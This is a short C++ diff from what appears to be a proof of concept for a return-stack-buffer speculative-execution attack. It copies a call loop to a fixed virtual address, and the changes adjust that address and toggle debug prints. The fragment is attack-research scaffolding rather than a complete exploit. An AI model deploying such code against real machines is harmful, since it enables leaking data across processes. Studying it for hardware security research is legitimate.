@@ -12,7 +12,7 @@ using namespace std;
 // have the same effect - the victim pushes an address onto the
 // RSB which is consumed by the attacker.  
 void callLoop() {
-	addressLbl:	printf("Call loop located at %p\n", &&addressLbl);
+	// addressLbl:	printf("Call loop located at %p\n", &&addressLbl);
 	// Call instructions push the instruciton pointer onto the stack.
 	// Pop %rax to avoid overflowing the stack.
 	asm(
@@ -27,10 +27,10 @@ int main(int argc, char *argv[]){
 	if (argc == 1) {
 		// print("choose a memory offset 0 through 200")
 		// read offset as input
-		void *requestedAddr = (void *)0x0000555555647000; // use input
-		// printf("requesting memory at %p\n", requestedAddr);
+		void *requestedAddr = (void *)0x0000555555587000; // use input
+		printf("requesting memory at %p\n", requestedAddr);
 		void *newFunc = map((void *)((ADDR_PTR)requestedAddr-4096), 1024);
-		// printf("starting address is %p\n", newFunc);
+		printf("starting address is %p\n", newFunc);
 		memcpy(newFunc, (void *)&callLoop, 1024);
 
 		printf("Function is running at virtual address %p.\n", newFunc);
